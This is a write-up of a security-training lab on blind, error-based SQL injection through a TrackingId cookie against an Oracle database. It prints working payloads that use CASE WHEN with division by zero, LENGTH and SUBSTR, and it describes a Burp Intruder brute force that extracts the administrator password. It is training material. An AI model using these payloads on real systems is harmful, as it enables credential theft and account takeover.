Lab 12 — Blind SQL injection with conditional errors

🔴 High 📅 2026-05-18

📋 Finding Summary

FieldValue
TypeWeb App
Severity🔴 High
CVE / CWECWE-89
Date2026-05-18

🔍 Description

This lab contains a blind SQL injection vulnerability in the TrackingId cookie. Unlike conditional response labs, the application does not render any visible difference in output based on query results — instead, it returns a 500 Internal Server Error when an injected SQL expression causes a database error. By crafting conditional division-by-zero payloads, an attacker can use the presence or absence of a server error as a true/false signal to enumerate the database one character at a time.

🎯 End Goals

  • Confirm blind SQL injection in the TrackingId cookie via conditional server errors
  • Identify the database type using Oracle-specific syntax
  • Verify the users table contains an administrator account
  • Determine the exact length of the administrator password
  • Extract the full password character by character using SUBSTR-based conditional errors
  • Log in as administrator to solve the lab

🪜 Steps to Reproduce

  1. Browse to the lab and capture a request in Burp Suite. Confirm the TrackingId cookie is present.
  2. Append a single quote to the TrackingId value and observe a 500 error, confirming SQL injection.
  3. Test OR 1=1 -- - and OR 1=2 -- - — both return 200, confirming no conditional output signal exists.
  4. Test || concatenation syntax to confirm the database supports it.
  5. Query v$version to confirm the database is Oracle.
  6. Probe the users table and use ROWNUM=1 to confirm it exists.
  7. Attempt to detect the administrator account via concatenation — both real and fake usernames return 200, confirming a conditional error technique is needed.
  8. Use a CASE WHEN ... THEN TO_CHAR(1/0) payload to trigger a 500 only when the administrator account exists.
  9. Use LENGTH(password) with the conditional error to determine the password length.
  10. Run Burp Intruder Sniper iterating 1–30 to pinpoint the exact password length.
  11. Manually verify the SUBSTR approach before automating.
  12. Configure Burp Intruder Cluster Bomb with character index 1–20 and candidate characters a–z and 0–9.
  13. Run the attack, filter by 5xx responses, and assemble the full password.
  14. Log in as administrator using the recovered password.

🧠 Analysis

Step 1 — Cookie Observed Being Set

Browsed to the lab home page with Burp Suite intercepting. Observed the server setting the TrackingId cookie in the response, establishing that this cookie is assigned by the application on first visit.

Step 2 — Cookie Sent in Request

Refreshed the page. The browser sent the TrackingId cookie back in the request, confirming the application receives and processes the cookie value on every request.

Step 3 — Single Quote Triggers 500

Appended a single quote after the TrackingId value with payload '. The server returned a 500 Internal Server Error, hinting the cookie value is embedded directly in a SQL query without sanitization.

Step 4 — OR 1=1 Returns 200

Injected payload ' OR 1=1 -- -. The server returned 200 OK, showing the query executed without error when given a true condition.

Step 5 — OR 1=2 Also Returns 200

Injected payload ' OR 1=2 -- -. The server also returned 200 OK — both true and false conditions produce the same response, confirming no conditional output signal exists in this lab. Only server errors can be used as a true/false signal.

Step 6 — String Concatenation Syntax Works

Injected payload '||'. The server returned 200 OK, confirming the database supports || string concatenation syntax.

Step 7 — Oracle Confirmed via v$version

Queried the Oracle-specific v$version view with payload '||(SELECT banner FROM v$version)||'. The server returned 200 OK, confirming the backend database is Oracle.

Step 8 — Users Table Probed

Injected payload '||(SELECT 'a' FROM users)||'. The server returned 500 — the subquery returned multiple rows, causing the concatenation to fail. This hinted the users table may exist but the query was returning more than one row, signaling the need to limit the result to a single entry before any conclusion could be drawn.

Step 9 — Single Row Confirmed, Users Table Exists

Added WHERE ROWNUM=1 to limit the result to one row; full payload: '||(SELECT 'a' FROM users WHERE ROWNUM=1)||'. The server returned 200 OK, confirming the users table exists and the query structure is correct.

Step 10 — Concatenation Cannot Signal Account Existence

Added WHERE username = 'administrator'; full payload: '||(SELECT 'a' FROM users WHERE username = 'administrator')||' → 200 OK. Then tested a fake username with payload '||(SELECT 'a' FROM users WHERE username = 'administratorhuhuhu')||' → also 200 OK. Both real and fake usernames return the same response, confirming the concatenation approach cannot detect account existence. A conditional error technique is needed instead.

Step 11 — Conditional Error Confirms Administrator Exists

Replaced the concatenation with a CASE expression that triggers a division-by-zero error on a true condition. Full payload with real username: '||(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')||' → 500 Internal Server Error. Same payload with fake username 'administratorjhjhj' → 200 OK. The error fires only when the account exists, establishing a reliable true/false signal based on the 500 error.

Step 12 — Password Length >1

Added AND LENGTH(password)>1 to the CASE condition; full payload: '||(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator' AND LENGTH(password)>1)||' → 500, confirming the password is longer than 1 character.

Step 13 — Password Length >30

Same payload with LENGTH(password)>30 → 200 OK, confirming the password is not longer than 30 characters. This narrowed the password length to somewhere between 1 and 30 characters.

Step 14 — Exact Length via Sniper Attack

Configured Burp Intruder Sniper mode with the LENGTH threshold as the payload position, iterating numbers 1–30, filtering for 5xx responses. Payload 19 triggered a 500 error (true — password length is greater than 19), while payload 20 returned 200 OK (false — password length is not greater than 20), confirming the password is exactly 20 characters long.

Step 15 — SUBSTR Manual Test

Replaced the LENGTH condition with a SUBSTR check to test individual characters; full payload: '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')||' → 200 OK, confirming the first character is not ‘a’ and validating the SUBSTR approach before automating.

Step 16 — Cluster Bomb Setup

Configured Burp Intruder Cluster Bomb mode. Payload set 1 (character index): numbers 1–20. Payload set 2 (candidate character): brute forcer covering a–z and 0–9, totalling 36 characters and 720 requests. The payload template used SUBSTR(password,§1§,1)='§a§' inside the CASE condition.

Step 17 — Cluster Bomb Results

Ran the Cluster Bomb attack across all 20 positions and 36 candidate characters. Filtered results by 5xx responses — the 20 requests that triggered a server error revealed the matching character for each position. Reading the matching character per position assembled the full administrator password: p1bwrolictbuo9jmv2kb

Step 18 — Lab Solved

Navigated to the login page and authenticated as administrator with the extracted password p1bwrolictbuo9jmv2kb. The application confirmed the credentials and displayed “Congratulations, you solved the lab!”

🎯 Impact

Blind error-based SQL injection allows an attacker to exfiltrate arbitrary data from the database using only the presence or absence of a server error as a signal. In this lab, the full administrator password was recovered character by character without any visible output, enabling complete account takeover. In a real application this technique could be used to dump all user credentials, session tokens, or any sensitive data accessible to the database user, compromising the entire application and its users.
